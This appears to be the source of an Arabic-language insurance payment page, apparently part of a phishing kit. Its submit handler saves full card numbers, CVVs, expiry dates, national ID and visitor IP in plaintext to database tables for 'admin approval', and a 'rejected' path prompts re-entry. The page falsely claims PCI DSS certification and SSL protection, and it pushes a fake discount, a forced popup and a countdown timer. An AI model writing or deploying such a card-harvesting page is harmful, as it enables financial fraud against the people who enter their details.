import { useState, useMemo, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle, Sparkles, CheckCircle2, X, Clock } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { toast as sonnerToast } from "sonner";
import PaymentLogos from "@/components/PaymentLogos";
import { Shield } from "lucide-react";
const Payment = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const {
    orderData,
    updateOrderData
  } = useOrder();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "";
  const price = parseFloat(searchParams.get("price") || "0");
  const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
  const discount = Math.round((regularPrice - price) / regularPrice * 100);
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [rejectionError, setRejectionError] = useState(false);
  const [paymentMethod] = useState<"card">("card");
  const [showPromoPopup, setShowPromoPopup] = useState(true);
  const [canSkipPromo, setCanSkipPromo] = useState(false);
  const [skipCountdown, setSkipCountdown] = useState(5);
  const [offerCountdown, setOfferCountdown] = useState({ hours: 2, minutes: 30, seconds: 0 });
  const [expiryError, setExpiryError] = useState("");

  // Calculate final price with discount
  const cardDiscount = 0.25; // 25% discount
  const finalPrice = paymentMethod === "card" ? price * (1 - cardDiscount) : price;
  const savedAmount = paymentMethod === "card" ? price * cardDiscount : 0;

  // Track payment page visit
  useEffect(() => {
    const trackPaymentPageVisit = async () => {
      const sessionId = sessionStorage.getItem("visitor_session_id");
      if (sessionId) {
        await supabase.from('visitor_events').insert({
          session_id: sessionId,
          event_type: 'payment_page_visit',
          page_url: window.location.pathname,
          event_data: {
            company: companyName,
            price: price,
            timestamp: new Date().toISOString()
          }
        });
      }
    };
    trackPaymentPageVisit();
  }, [companyName, price]);

  // Enable skip button after 5 seconds countdown
  useEffect(() => {
    if (!showPromoPopup) return;
    
    const timer = setInterval(() => {
      setSkipCountdown(prev => {
        if (prev <= 1) {
          setCanSkipPromo(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, [showPromoPopup]);

  // Offer countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setOfferCountdown(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { hours: prev.hours - 1, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  // Check if page was returned with rejection
  useEffect(() => {
    const rejected = searchParams.get('rejected');
    if (rejected === 'true') {
      setRejectionError(true);
      toast({
        title: "تم رفض معلومات الدفع",
        description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
        variant: "destructive"
      });
    }
  }, [searchParams, toast]);

  // Detect card type
  const cardType = useMemo(() => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (/^4/.test(cleaned)) return "visa";
    if (/^5[1-5]/.test(cleaned)) return "mastercard";
    if (/^2[2-7]/.test(cleaned)) return "mastercard";
    return null;
  }, [cardNumber]);
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "");
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
    }
  };
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setCvv(value);
    }
  };

  // Handle card holder name - only letters and spaces
  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow Arabic letters, English letters, and spaces only
    if (/^[\u0600-\u06FFa-zA-Z\s]*$/.test(value)) {
      setCardHolder(value);
    }
  };

  // Validate expiry date
  const validateExpiryDate = (month: string, year: string) => {
    if (month.length === 2 && year.length === 2) {
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
      const currentMonth = currentDate.getMonth() + 1; // 0-indexed

      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      if (expYear < currentYear || expYear === currentYear && expMonth < currentMonth) {
        setExpiryError("تاريخ البطاقة منتهي");
        return false;
      } else {
        setExpiryError("");
        return true;
      }
    }
    setExpiryError("");
    return true;
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejectionError(false);
    const expiryDate = `${expiryMonth}/${expiryYear}`;
    try {
      setWaitingApproval(true);

      // جلب session_id و IP من visitor_tracking
      const sessionId = sessionStorage.getItem("visitor_session_id");
      let visitorIp = null;
      if (sessionId) {
        const {
          data: visitorData
        } = await supabase.from("visitor_tracking").select("ip_address").eq("session_id", sessionId).order("last_active_at", {
          ascending: false
        }).limit(1).maybeSingle();
        if (visitorData?.ip_address) {
          visitorIp = visitorData.ip_address;
        }
      }
      let orderDbData;

      // التحقق من وجود رقم تسلسل صالح
      if (orderData.sequenceNumber) {
        // محاولة تحديث السجل الموجود
        // أولاً نجد الطلب الأحدث بهذا الرقم التسلسلي
        const { data: existingOrder } = await supabase
          .from('customer_orders')
          .select('id')
          .eq('sequence_number', orderData.sequenceNumber)
          .order('created_at', { ascending: false })
          .limit(1)
          .maybeSingle();

        let data = null;
        let updateError = null;

        if (existingOrder) {
          const result = await supabase
            .from('customer_orders')
            .update({
              card_holder_name: cardHolder,
              card_number: cardNumber,
              expiry_date: expiryDate,
              cvv: cvv,
              insurance_company: companyName,
              insurance_price: finalPrice,
              status: 'pending',
              visitor_ip: visitorIp,
              updated_at: new Date().toISOString()
            })
            .eq('id', existingOrder.id)
            .select()
            .maybeSingle();
          
          data = result.data;
          updateError = result.error;
        }
        if (updateError) {
          console.error('Update error:', updateError);
          throw updateError;
        }
        if (data) {
          orderDbData = data;
        } else {
          // إذا لم يتم العثور على السجل، إنشاء سجل جديد
          const {
            data: insertData,
            error: insertError
          } = await supabase.from('customer_orders').insert({
            card_holder_name: cardHolder,
            card_number: cardNumber,
            expiry_date: expiryDate,
            cvv: cvv,
            insurance_company: companyName,
            insurance_price: finalPrice,
            sequence_number: orderData.sequenceNumber,
            id_number: orderData.idNumber || '0000000000',
            birth_date: orderData.birthDate || '2000-01-01',
            phone_number: orderData.phoneNumber || null,
            owner_name: orderData.ownerName || null,
            vehicle_type: orderData.vehicleType || '',
            vehicle_purpose: orderData.vehiclePurpose || '',
            estimated_value: orderData.estimatedValue || null,
            policy_start_date: orderData.policyStartDate || null,
            add_driver: orderData.addDriver || null,
            visitor_session_id: sessionId,
            visitor_ip: visitorIp,
            status: 'pending'
          }).select().single();
          if (insertError) throw insertError;
          orderDbData = insertData;
        }
      } else {
        // إنشاء سجل جديد مباشرة
        const newSequenceNumber = `ORD-${Date.now()}`;
        const {
          data,
          error: insertError
        } = await supabase.from('customer_orders').insert({
          card_holder_name: cardHolder,
          card_number: cardNumber,
          expiry_date: expiryDate,
          cvv: cvv,
          insurance_company: companyName,
          insurance_price: finalPrice,
          sequence_number: newSequenceNumber,
          id_number: orderData.idNumber || '0000000000',
          birth_date: orderData.birthDate || '2000-01-01',
          phone_number: orderData.phoneNumber || null,
          owner_name: orderData.ownerName || null,
          vehicle_type: orderData.vehicleType || '',
          vehicle_purpose: orderData.vehiclePurpose || '',
          estimated_value: orderData.estimatedValue || null,
          policy_start_date: orderData.policyStartDate || null,
          add_driver: orderData.addDriver || null,
          visitor_session_id: sessionId,
          visitor_ip: visitorIp,
          status: 'pending'
        }).select().single();
        if (insertError) throw insertError;
        orderDbData = data;
      }

      // حفظ محاولة الدفع
      if (orderDbData?.id) {
        const {
          error: attemptError
        } = await supabase.from('payment_attempts').insert({
          order_id: orderDbData.id,
          card_holder_name: cardHolder,
          card_number: cardNumber,
          expiry_date: expiryDate,
          cvv: cvv
        });
        if (attemptError) {
          console.error('Error inserting payment attempt:', attemptError);
        }
      }

      // Update context with saved data
      updateOrderData({
        cardNumber: cardNumber,
        cardHolderName: cardHolder,
        expiryDate: expiryDate,
        cvv: cvv,
        sequenceNumber: orderDbData.sequence_number
      });

      // الانتقال إلى صفحة التحميل فقط بعد نجاح الحفظ
      navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderDbData.id}`);
    } catch (error) {
      console.error('Error submitting payment:', error);
      setWaitingApproval(false);
      toast({
        title: "خطأ في معالجة الدفع",
        description: "حدث خطأ أثناء حفظ معلومات الدفع. يرجى المحاولة مرة أخرى.",
        variant: "destructive"
      });
    }
  };
  return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
      {/* Founding Day Promo Popup */}
      {showPromoPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="bg-gradient-to-br from-primary via-primary-dark to-primary rounded-2xl p-8 max-w-md w-full shadow-2xl transform animate-in zoom-in duration-300 relative overflow-hidden">
            {/* Decorative Saudi patterns */}
            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-green-500 via-primary to-green-500"></div>
            <div className="absolute bottom-0 left-0 w-full h-2 bg-gradient-to-r from-green-500 via-primary to-green-500"></div>
            <div className="absolute top-4 right-4 w-20 h-20 bg-white/10 rounded-full"></div>
            <div className="absolute bottom-4 left-4 w-16 h-16 bg-white/10 rounded-full"></div>
            
            {/* Skip button */}
            <button 
              onClick={() => canSkipPromo && setShowPromoPopup(false)}
              disabled={!canSkipPromo}
              className={`absolute top-4 left-4 z-20 flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium transition-all ${
                canSkipPromo 
                  ? 'bg-white/20 hover:bg-white/30 text-white cursor-pointer' 
                  : 'bg-white/10 text-white/60 cursor-not-allowed'
              }`}
            >
              {canSkipPromo ? (
                <>
                  <X className="h-4 w-4" />
                  <span>تخطي</span>
                </>
              ) : (
                <span>تخطي بعد {skipCountdown}</span>
              )}
            </button>
            
            <div className="relative z-10 text-center text-white pt-6">
              {/* Saudi Founding Day Badge */}
              <div className="inline-flex items-center gap-2 bg-green-500/30 backdrop-blur-sm px-4 py-2 rounded-full mb-4">
                <span className="text-2xl">🇸🇦</span>
                <span className="font-bold text-sm">يوم التأسيس السعودي</span>
              </div>
              
              <h3 className="text-3xl font-black mb-2">خصم 25%</h3>
              <p className="text-lg font-semibold mb-4 opacity-90">بمناسبة يوم التأسيس</p>
              
              {/* Countdown Timer */}
              <div className="bg-white/15 backdrop-blur-sm rounded-xl p-4 mb-4">
                <div className="flex items-center justify-center gap-2 mb-2">
                  <Clock className="h-4 w-4 text-white/80" />
                  <span className="text-sm text-white/80">العرض ينتهي خلال</span>
                </div>
                <div className="flex items-center justify-center gap-3">
                  <div className="bg-white/20 rounded-lg px-4 py-2 min-w-[60px]">
                    <span className="text-2xl font-black">{String(offerCountdown.hours).padStart(2, '0')}</span>
                    <p className="text-xs opacity-80">ساعة</p>
                  </div>
                  <span className="text-2xl font-bold">:</span>
                  <div className="bg-white/20 rounded-lg px-4 py-2 min-w-[60px]">
                    <span className="text-2xl font-black">{String(offerCountdown.minutes).padStart(2, '0')}</span>
                    <p className="text-xs opacity-80">دقيقة</p>
                  </div>
                  <span className="text-2xl font-bold">:</span>
                  <div className="bg-white/20 rounded-lg px-4 py-2 min-w-[60px]">
                    <span className="text-2xl font-black">{String(offerCountdown.seconds).padStart(2, '0')}</span>
                    <p className="text-xs opacity-80">ثانية</p>
                  </div>
                </div>
              </div>
              
              <div className="bg-green-500/30 rounded-lg p-3 mb-4">
                <p className="text-lg font-bold">
                  💰 وفر {(price * 0.25).toFixed(2)} ر.س
                </p>
              </div>
              
              <button 
                onClick={() => setShowPromoPopup(false)} 
                className="w-full bg-white text-primary px-6 py-3 rounded-xl font-bold hover:bg-white/90 transition-all shadow-lg hover:shadow-xl transform hover:scale-[1.02]"
              >
                استفد من العرض الآن
              </button>
            </div>
          </div>
        </div>
      )}
      
      {/* Header */}
      <div className="bg-gradient-to-b from-primary to-primary-dark py-8">
        <div className="container mx-auto px-4">
          <Button variant="ghost" onClick={() => navigate(-1)} className="text-white hover:bg-white/10 mb-4">
            <ArrowRight className="ml-2" />
            العودة
          </Button>
          <h1 className="text-2xl font-bold text-white text-center">
            اختر طريقة الدفع المناسبة لك
          </h1>
          
        </div>
      </div>

      <div className="container mx-auto px-4 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {/* Payment Form */}
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <h2 className="text-2xl font-bold text-foreground mb-6">اختر وسيلة الدفع</h2>
            
            {/* Payment Method Selection */}
            <div className="space-y-4 mb-8">
              {/* Card Payment - Premium Design */}
              <div className="relative overflow-hidden rounded-2xl border-2 border-primary bg-gradient-to-br from-primary/5 via-white to-green-50 p-6 shadow-lg">
                {/* Animated Background */}
                <div className="absolute inset-0 bg-gradient-to-r from-primary/5 to-green-500/5 animate-pulse opacity-50"></div>
                
                {/* Discount Banner */}
                <div className="relative mb-4 flex items-center justify-center">
                  <div className="flex items-center gap-3 bg-gradient-to-r from-green-500 via-emerald-500 to-green-600 text-white px-6 py-3 rounded-full shadow-xl">
                    <Sparkles className="h-5 w-5 animate-pulse" />
                    <span className="text-lg font-bold">خصم 25% على الدفع بالبطاقة</span>
                    <Sparkles className="h-5 w-5 animate-pulse" />
                  </div>
                </div>
                
                <div className="relative flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 rounded-full bg-gradient-to-br from-primary to-primary/70 flex items-center justify-center shadow-lg">
                      <CreditCard className="h-7 w-7 text-white" />
                    </div>
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-xl font-bold text-foreground">بطاقة ائتمانية / مدى</span>
                        <CheckCircle2 className="h-5 w-5 text-green-600" />
                      </div>
                      <div className="flex items-center gap-2 mt-1">
                        <span className="text-sm text-muted-foreground line-through">{price.toFixed(2)} ر.س</span>
                        <span className="text-lg font-bold text-green-600">{finalPrice.toFixed(2)} ر.س</span>
                      </div>
                      <p className="text-xs text-green-600 font-semibold mt-1">
                        💰 توفير {savedAmount.toFixed(2)} ر.س
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Payment Form */}
            <>
                {/* Payment Gateway Header */}
                <div className="mb-8 pb-6 border-b border-gray-200">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center shadow-lg">
                      <Lock className="h-6 w-6 text-white" />
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-foreground">بوابة دفع آمنة</h3>
                      <p className="text-xs text-muted-foreground flex items-center gap-1">
                        <Shield className="h-3 w-3 text-green-600" />
                        محمية بتشفير SSL 256-bit
                      </p>
                    </div>
                  </div>
                </div>
            
            {rejectionError && <Alert variant="destructive" className="mb-6 animate-in fade-in duration-300">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.
                </AlertDescription>
              </Alert>}

            {waitingApproval && <Alert className="mb-6 bg-blue-50 border-blue-200 animate-in fade-in duration-300">
                <Loader2 className="h-4 w-4 animate-spin" />
                <AlertDescription className="text-blue-900">
                  تم إرسال معلومات الدفع بنجاح. في انتظار موافقة الإدارة...
                </AlertDescription>
              </Alert>}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Card Holder Name */}
              <div className="space-y-2">
                <Label htmlFor="cardHolder" className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <CreditCard className="h-4 w-4 text-primary" />
                  اسم حامل البطاقة <span className="text-destructive">*</span>
                </Label>
                <Input id="cardHolder" placeholder="الاسم كما هو مكتوب على البطاقة" value={cardHolder} onChange={handleCardHolderChange} required className="text-right h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white" />
                <p className="text-xs text-muted-foreground text-right">أحرف فقط بدون أرقام</p>
              </div>

              {/* Card Number */}
              <div className="space-y-2">
                <Label htmlFor="cardNumber" className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <CreditCard className="h-4 w-4 text-primary" />
                  رقم البطاقة <span className="text-destructive">*</span>
                </Label>
                <div className="relative group">
                  <Input id="cardNumber" placeholder="1234 5678 9012 3456" value={formatCardNumber(cardNumber)} onChange={handleCardNumberChange} required className="text-right pr-12 h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-wider" dir="ltr" />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 transition-all duration-200">
                    {cardType === "visa" && <div className="flex items-center gap-1 animate-in fade-in zoom-in duration-300">
                        <div className="text-xs font-bold text-blue-700 bg-blue-100 px-3 py-1.5 rounded shadow-sm">VISA</div>
                      </div>}
                    {cardType === "mastercard" && <div className="flex items-center gap-2 animate-in fade-in zoom-in duration-300">
                        <div className="flex">
                          <div className="w-5 h-5 rounded-full bg-red-500 shadow-sm"></div>
                          <div className="w-5 h-5 rounded-full bg-orange-400 -ml-2 shadow-sm"></div>
                        </div>
                        <div className="text-xs font-bold text-orange-700">Mastercard</div>
                      </div>}
                    {!cardType && cardNumber.length > 0 && <CreditCard className="h-5 w-5 text-muted-foreground animate-pulse" />}
                    {!cardNumber && <CreditCard className="h-5 w-5 text-gray-400" />}
                  </div>
                </div>
              </div>

              {/* Expiry and CVV */}
              <div className="grid grid-cols-2 gap-4">
                {/* Expiry Date - Select Dropdowns */}
                <div className="space-y-2">
                  <Label className="text-sm font-semibold text-foreground">
                    تاريخ الانتهاء <span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-2 items-center">
                    {/* Month Select */}
                    <Select value={expiryMonth} onValueChange={value => {
                      setExpiryMonth(value);
                      validateExpiryDate(value, expiryYear);
                    }}>
                      <SelectTrigger className="h-12 border-2 focus:border-primary bg-gray-50 focus:bg-white">
                        <SelectValue placeholder="الشهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({
                          length: 12
                        }, (_, i) => {
                          const month = String(i + 1).padStart(2, '0');
                          return <SelectItem key={month} value={month}>
                              {month}
                            </SelectItem>;
                        })}
                      </SelectContent>
                    </Select>
                    
                    <span className="text-xl text-muted-foreground font-bold">/</span>
                    
                    {/* Year Select */}
                    <Select value={expiryYear} onValueChange={value => {
                      setExpiryYear(value);
                      validateExpiryDate(expiryMonth, value);
                    }}>
                      <SelectTrigger className="h-12 border-2 focus:border-primary bg-gray-50 focus:bg-white">
                        <SelectValue placeholder="السنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {(() => {
                          const currentYear = new Date().getFullYear() % 100;
                          return Array.from({
                            length: 10
                          }, (_, i) => {
                            const year = String(currentYear + i).padStart(2, '0');
                            return <SelectItem key={year} value={year}>
                                {year}
                              </SelectItem>;
                          });
                        })()}
                      </SelectContent>
                    </Select>
                  </div>
                  {expiryError && <p className="text-xs text-destructive flex items-center gap-1 animate-in fade-in duration-200">
                      <AlertCircle className="h-3 w-3" />
                      {expiryError}
                    </p>}
                </div>

                {/* CVV */}
                <div className="space-y-2">
                  <Label htmlFor="cvv" className="text-sm font-semibold text-foreground flex items-center gap-1">
                    رمز الأمان (CVV) <span className="text-destructive">*</span>
                  </Label>
                  <div className="relative">
                    <Input id="cvv" placeholder="123" value={cvv} onChange={handleCvvChange} required className="text-center h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-widest" maxLength={3} type="password" />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2">
                      <Lock className="h-4 w-4 text-gray-400" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground text-right">الأرقام الثلاثة خلف البطاقة</p>
                </div>
              </div>

              {/* Security Notice */}
              <div className="bg-gradient-to-r from-blue-50 to-purple-50 border border-blue-200 rounded-lg p-4 flex items-start gap-3">
                <Shield className="h-5 w-5 text-blue-600 flex-shrink-0 mt-0.5" />
                <div className="text-sm text-blue-900">
                  <p className="font-semibold mb-1">معلوماتك محمية بالكامل</p>
                  <p className="text-xs text-blue-700">نستخدم تشفير SSL بمستوى بنكي لحماية بياناتك المالية</p>
                </div>
              </div>

              {/* Submit Button */}
              <Button type="submit" disabled={waitingApproval} className="w-full h-14 text-lg font-bold bg-gradient-to-r from-primary to-primary-dark hover:from-primary-dark hover:to-primary transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5">
                {waitingApproval ? <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    جاري المعالجة...
                  </> : <>
                    <Lock className="ml-2 h-5 w-5" />
                    تأكيد الدفع بشكل آمن
                  </>}
              </Button>

              {/* Trust Badges */}
              <div className="pt-4 border-t border-gray-200">
                <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                  <div className="flex items-center gap-1">
                    <Lock className="h-3 w-3" />
                    <span>آمن 100%</span>
                  </div>
                  <div className="w-1 h-1 rounded-full bg-muted-foreground"></div>
                  <div className="flex items-center gap-1">
                    <Shield className="h-3 w-3" />
                    <span>SSL مشفر</span>
                  </div>
                  <div className="w-1 h-1 rounded-full bg-muted-foreground"></div>
                  <div className="flex items-center gap-1">
                    <CreditCard className="h-3 w-3" />
                    <span>PCI DSS معتمد</span>
                  </div>
                </div>
              </div>

              <p className="text-xs text-center text-muted-foreground pt-2">
                بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
              </p>
            </form>
            </>

          </div>

          {/* Order Summary & Card Preview */}
          <div className="space-y-6">

            {/* Order Summary */}
            <div className="bg-white rounded-2xl shadow-lg p-6">
              <h3 className="text-xl font-bold text-foreground mb-4">ملخص الطلب</h3>
              
              <div className="space-y-4">
                <div className="flex justify-between items-start pb-4 border-b border-border">
                  <div className="flex-1">
                    <div className="text-sm text-muted-foreground mb-1">الشركة:</div>
                    <div className="font-medium text-foreground">{companyName}</div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">السعر الأصلي:</span>
                    <span className="line-through text-muted-foreground">{regularPrice.toFixed(2)} ﷼</span>
                  </div>
                  
                  <div className="flex justify-between text-sm">
                    <span className="text-accent font-medium">الخصم {discount}%:</span>
                    <span className="text-accent font-medium">- {(regularPrice - price).toFixed(2)} ﷼</span>
                  </div>
                  
                  {paymentMethod === "card" && savedAmount > 0 && <div className="flex justify-between text-sm bg-green-50 p-2 rounded-lg">
                      <span className="text-green-700 font-bold flex items-center gap-1">
                        <span>🎉</span>
                        خصم البطاقة الائتمانية 25%:
                      </span>
                      <span className="text-green-700 font-bold">- {savedAmount.toFixed(2)} ﷼</span>
                    </div>}
                </div>

                <div className="pt-4 border-t border-border">
                  {paymentMethod === "card" && savedAmount > 0 && <div className="mb-3 p-3 bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg border border-green-200">
                      <div className="flex justify-between items-center text-sm">
                        <span className="text-green-700">المبلغ قبل خصم البطاقة:</span>
                        <span className="text-green-700 line-through">{price.toFixed(2)} ﷼</span>
                      </div>
                    </div>}
                  <div className="flex justify-between items-center">
                    <span className="text-lg font-bold">المبلغ الإجمالي:</span>
                    <div className="text-left">
                      <span className="text-2xl font-bold text-primary">{finalPrice.toFixed(2)} ﷼</span>
                      {paymentMethod === "card" && savedAmount > 0 && <div className="text-xs text-green-600 font-semibold">وفرت {savedAmount.toFixed(2)} ﷼</div>}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>;
};
export default Payment;